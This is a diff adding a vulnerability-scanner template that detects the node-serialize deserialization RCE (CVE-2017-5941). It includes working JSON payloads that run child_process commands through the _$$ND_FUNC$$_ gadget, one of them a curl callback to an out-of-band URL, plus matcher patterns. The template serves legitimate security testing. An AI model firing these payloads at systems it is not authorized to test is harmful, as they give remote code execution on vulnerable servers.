@@ -1,0 +1,23 @@
+id: nodejs-serialize
+info:
+  name: "Node.js Deserialization"
+  severity: critical
+  description: "Detects node-serialize IIFE deserialization RCE (CVE-2017-5941)"
+  tags: [deserialization, nodejs, javascript, rce, gadget]
+  author: Wired
+
+inject: body
+detection: pattern
+
+payloads:
+  - '{"rce":"_$$ND_FUNC$$_function(){return require(\"child_process\").execSync(\"echo akemi_nodedeser\")}()"}'
+  - '{"test":"_$$ND_FUNC$$_function(){return 1+1}()"}'
+
+matchers:
+  body_patterns:
+    - "akemi_nodedeser"
+    - "_\\$\\$ND_FUNC\\$\\$_"
+    - "(?i)child_process"
+
+oob_payloads:
+  - '{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"curl {{OOB_URL}}\")}()"}'
